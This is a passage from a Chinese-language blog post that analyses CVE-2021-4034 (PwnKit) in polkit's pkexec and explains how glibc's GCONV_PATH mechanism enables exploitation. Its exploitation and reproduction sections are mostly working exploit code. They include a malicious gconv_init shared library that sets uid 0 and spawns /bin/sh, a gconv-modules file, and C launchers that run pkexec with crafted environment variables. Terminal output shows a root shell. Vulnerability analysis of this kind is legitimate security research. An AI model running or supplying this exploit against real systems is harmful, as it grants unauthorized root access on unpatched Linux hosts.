class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的具体说明位于<a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_mono/libc.html#Generic-Charset-Conversion">Generic-Charset-Conversion</a>。注意到这一段话：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The GNU C Library implementation of iconv_open has one significant extension to other implementations. To ease the extension of the set of available conversions, the implementation allows storing the necessary files with data and code in an arbitrary number of directories. How this extension must be written will be explained below (see glibc iconv Implementation). Here it is only important to say that all directories mentioned in the GCONV_PATH environment variable are considered only if they contain a file gconv-modules. These directories need not necessarily be created by the system administrator. In fact, this extension is introduced to help users writing and using their own, new conversions. Of course, this does not work for security reasons in SUID binaries; in this case only the system directory is considered and this normally is prefix/lib/gconv. The GCONV_PATH environment variable is examined exactly once at the first call of the iconv_open function. Later modifications of the variable have no effect.</span><br></pre></td></tr></table></figure>

<p>大意为：<code>Glibc</code>为了简化可用转换集的扩展，其对<code>iconv_open</code>的实现允许将必要的文件与数据和代码一起存储在任意数量的目录中。<code>GCONV_PATH</code>环境变量中提到的所有目录只有在它们包含文件<code>gconv-modules</code>时才会被考虑。这些目录不一定需要由系统管理员创建，引入这个扩展是为了帮助用户编写和使用他们自己的新转换。出于安全原因，这在<code>SUID</code>二进制文件中不起作用；在这种情况下，只考虑系统目录，通常是<code>prefix/lib/gconv</code>。<code>GCONV_PATH</code>环境变量在第一次调用<code>iconv_open</code>函数时被检查一次。以后对该变量的修改没有效果。</p>
<p>之后<code>Format of gconv-modules files</code>节提到了<code>gconv-modules</code>文件的格式，每个字符集的相关信息存储在一个<code>.so</code>文件中，<code>gconv-modules</code>文件中包含了各个字符集的相关信息存储的路径。</p>
<p>文档中还提到了<code>iconv</code>模块的接口，三个接口如下：</p>
<ul>
<li><code>gconv_init</code>：该函数初始化转换函数特定的数据结构。使用此转换的所有转换都共享这个相同的对象，因此，不必将有关转换本身的状态信息存储在此处。如果一个模块实现了不止一次的转换，<code>gconv_init</code>函数会被调用多次</li>
<li><code>gconv_end</code>：该函数负责释放<code>gconv_init</code>函数分配的所有资源。如果没有什么可做的，则可能缺少此函数。如果模块实现了多个转换并且<code>gconv_init</code>函数没有为所有转换分配相同的资源，则必须特别小心</li>
<li><code>gconv</code>：该函数是实际的转换函数。调用它来转换一个文本块</li>
</ul>
<p>在配置好<code>gconv-modules</code>文件的情况下，在<code>gconv_init</code>函数中写入命令并编译为<code>.so</code>文件，通过写入的环境变量加载<code>.so</code>文件并触发<code>g_printerr</code>函数即可执行写入的命令。</p>
<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><p>首先需要利用越界写入将敏感环境变量写入，步骤如下：</p>
<ul>
<li>创建目录<code>GCONV_PATH=.</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~$ mkdir GCONV_PATH=.</span><br></pre></td></tr></table></figure>

<ul>
<li>在目录中放入可执行文件：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~$ touch GCONV_PATH\=./shell</span><br><span class="line">luck@ba6351c95b9b:~$ chmod a+x GCONV_PATH\=./shell</span><br></pre></td></tr></table></figure>

<ul>
<li>设置<code>argv</code>和<code>envp</code>并调用<code>execve</code>执行<code>pkexec</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * <span class="keyword">const</span> my_args[] = &#123;</span><br><span class="line">                <span class="literal">NULL</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">char</span> * <span class="keyword">const</span> my_environ[] = &#123;</span><br><span class="line">                <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">                <span class="literal">NULL</span></span><br><span class="line">        &#125;;</span><br><span class="line">        execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, my_args, my_environ);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行该程序，越界写入后，<code>GCONV_PATH=./shell</code>被写入环境变量。</p>
<p>然后是利用该环境变量加载<code>.so</code>并触发<code>g_printerr</code>以执行命令，越界写入环境变量后，还需要创建一个环境变量中的目录，其中存在<code>.so</code>文件以及<code>gconv-modules</code>文件，最后分析<code>validate_environment_variable</code>函数，使利用程序满足触发<code>g_printerr</code>的条件即可执行命令。</p>
<p>总体步骤如下：</p>
<ul>
<li>编写提权程序并编译为<code>.so</code>文件：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~/pwn$ cat shell.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">void gconv(void) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void gconv_init(void *step)</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        char * const args[] = &#123; &quot;/bin/sh&quot;, NULL &#125;;</span><br><span class="line">        char * const environ[] = &#123; &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;, NULL &#125;;</span><br><span class="line">        execve(args[0], args, environ);</span><br><span class="line">        exit(0);</span><br><span class="line">&#125;</span><br><span class="line">luck@ba6351c95b9b:~/pwn$ gcc -shared -fPIC shell.c -o shell.so</span><br></pre></td></tr></table></figure>

<ul>
<li>编写<code>gconv-modules</code>文件并与<code>shell.so</code>文件放入文件夹<code>shell</code>中：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~/pwn$ mkdir shell</span><br><span class="line">luck@ba6351c95b9b:~/pwn$ echo &quot;module UTF-8// SHELL// shell 1&quot; &gt; shell/gconv-modules</span><br><span class="line">luck@ba6351c95b9b:~/pwn$ cp shell.so shell/</span><br></pre></td></tr></table></figure>

<ul>
<li>编写利用代码并编译：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~/pwn$ cat <span class="built_in">exp</span>.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * <span class="keyword">const</span> args[] = &#123;</span><br><span class="line">                <span class="literal">NULL</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">char</span> * <span class="keyword">const</span> environ[] = &#123;</span><br><span class="line">                <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">                <span class="string">&quot;SHELL=/luck/hah&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CHARSET=SHELL&quot;</span>,</span><br><span class="line">                <span class="literal">NULL</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, args, environ);</span><br><span class="line">&#125;</span><br><span class="line">luck@ba6351c95b9b:~/pwn$ gcc <span class="built_in">exp</span>.c -o <span class="built_in">exp</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建目录<code>GCONV_PATH=.</code>并满足越界写入的条件：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~/pwn$ mkdir GCONV_PATH=.</span><br><span class="line">luck@ba6351c95b9b:~/pwn$ touch GCONV_PATH\=./shell</span><br><span class="line">luck@ba6351c95b9b:~/pwn$ chmod a+x GCONV_PATH\=./shell</span><br></pre></td></tr></table></figure>

<ul>
<li>运行利用程序：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~/pwn$ ./exp</span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1000(luck)</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，利用脚本中使用<code>SHELL</code>环境变量<code>(一个不存在的shell)</code>来满足触发<code>g_printerr</code>函数的条件，使用<code>CHARSET=SHELL</code>使<code>g_printerr</code>更换编码，调用<code>.so</code>中的提权函数。除了使用<code>SHELL</code>环境变量触发<code>g_printerr</code>函数之外，还可以使用<code>XAUTHORITY</code>等环境变量，只要满足验证函数中的条件即可。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>编写利用程序进行复现：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">char *shell =</span><br><span class="line">        <span class="string">&quot;#include &lt;stdio.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;stdlib.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;unistd.h&gt;\n\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv() &#123;&#125;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv_init() &#123;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;       setuid(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;       setgid(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;       char * const args[] = &#123; \&quot;/bin/sh\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;       char * const environ[] = &#123; \&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;       execve(args[0], args, environ);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;       exit(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">        FILE *fp;</span><br><span class="line">        system(<span class="string">&quot;mkdir &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./shell&#x27;; chmod a+x &#x27;GCONV_PATH=./shell&#x27;&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;mkdir shell; echo &#x27;module UTF-8// SHELL// shell 1&#x27; &gt; shell/gconv-modules&quot;</span>);</span><br><span class="line">        fp = fopen(<span class="string">&quot;shell/shell.c&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fprintf(fp, <span class="string">&quot;%s&quot;</span>, shell);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        system(<span class="string">&quot;gcc shell/shell.c -o shell/shell.so -shared -fPIC&quot;</span>);</span><br><span class="line">        char * const args[] = &#123; NULL &#125;;</span><br><span class="line">        char * const environ[] = &#123; <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>, <span class="string">&quot;SHELL=/luck/hah&quot;</span>, <span class="string">&quot;CHARSET=SHELL&quot;</span>, NULL &#125;;</span><br><span class="line">        execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, args, environ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">luck@ba6351c95b9b:~$ vim exploit.c</span><br><span class="line">luck@ba6351c95b9b:~$ gcc exploit.c -o exploit</span><br><span class="line">luck@ba6351c95b9b:~$ ./exploit</span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1000(luck)</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) | Qualys Security Blog</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10870#toc-6">CVE-2021-4034 深入分析及漏洞复现 - 先知社区 (aliyun.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10905">CVE-2021-4034 pkexec再深入分析 - 先知社区 (aliyun.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">GitHub - berdav&#x2F;CVE-2021-4034: CVE-2021-4034 1day</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/GNOME/glib">GitHub - GNOME&#x2F;glib: Read-only mirror of https://gitlab.gnome.org/GNOME/glib</a></li>
<li><a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_mono/libc.html#Generic-Charset-Conversion">The GNU C Library</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/excc-flow2/" rel="prev" title="异常控制流(二)">
                  <i class="fa fa-chevron-left"></i> 异常控制流(二)
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/excc-flow3/" rel="next" title="异常控制流(三)">
                  异常控制流(三) <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Lu0k</span>
</div>

    </div>
  </footer>

  
  <script size="250" alpha="0.5" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="/js/third-party/search/local-search.js"></script>




  





</body>
</html>
